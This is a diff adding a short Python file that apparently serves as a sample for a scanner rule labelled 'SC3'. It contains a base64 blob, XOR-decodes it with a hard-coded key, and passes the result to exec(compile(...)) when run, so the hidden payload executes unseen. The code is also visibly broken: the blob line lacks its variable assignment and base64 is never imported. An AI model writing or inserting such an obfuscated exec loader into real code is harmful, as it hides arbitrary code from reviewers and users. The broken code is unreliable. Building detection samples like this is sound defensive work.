@@ -1,0 +1,13 @@
+tFmWt8hlgYS6Q930rGrL1/UN3/iGasvX9Q3d9YsuioO0D9P4xCWPjvkNiqrKF8f99Q3f+IZqy9f1Dd/4xSKOlL4QubnKOY7b9U6eqNI/mZKKQoqs1j+fyoFfir2KQMvX9Q3f+IZqwv31Dd/4hmrL16dIi63UJMujp1ia0oZqy9ewVZy91j7LsbxBmpbJPq2YoEObndQ4hIXvJ9/4hmrL1/UNjb3SP5mZ9WuetNUv4f2xSJn4+T+Zm7lEnYfWJZiD/ViNtIpqiZixVNbirGrL1/VfmqmGd8uCp0GTscRkmZKkWJqr0mS5kqRYmqvSYuHX9Q3f+IZqy4KnQdP4wiufluhPkLzfZI6ZtkKbvY5onoOzAMf6j2bLmrBZl7fCd8mnmn6r+opAy9f1Dd/4hmqDkrRJmqrVd5DVlkKRrMMkn9qBVI+9hHDL1bRdj7TPKYqDvEKR98w5hJn3UNPShmrL1/wn3/iGap+FrBf1+IZqy9f1Dd+t1CaHnrcDjb3XP46EoQOKqsolm5K7BY2912bLg7xAmrfTPtbC/Cff+IZqjo+2SI+shg+TlLBdi7HJJNH99Q3f+IZqy9elTIyrrECPkrMNkrnPJMPe7yff+IZqm5asQZC5wmrW179ekLaILp6apV7Xq8grm4S9Qovwj2Ph1/UN37HAaoWYoQ2gu9M4h6ilQoysjh+7pIF/upnrZsuHtFSTt8cuws3fDd/4hmrL1/VyiqrKJoKVil2Qq9JivqeGea2d5wfH16VMhrTJK4/e3yeWvoYVtJm0QJqH+WrWyvUPoIfLK4KZinLd4qxqy9f1QJ6xyGLC/Q=="
+_K = bytes.fromhex("d52dffd8a64aebf7")
+
+def _xor(buf, k):
+    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))
+
+def _decode():
+    raw = base64.b64decode(_BLOB)
+    return _xor(raw, _K).decode("utf-8")
+
+if __name__ == "__main__":
+    # SC3 signature: base64.b64decode(...) -> exec / compile near by
+    exec(compile(_decode(), "<runtime>", "exec"), {})
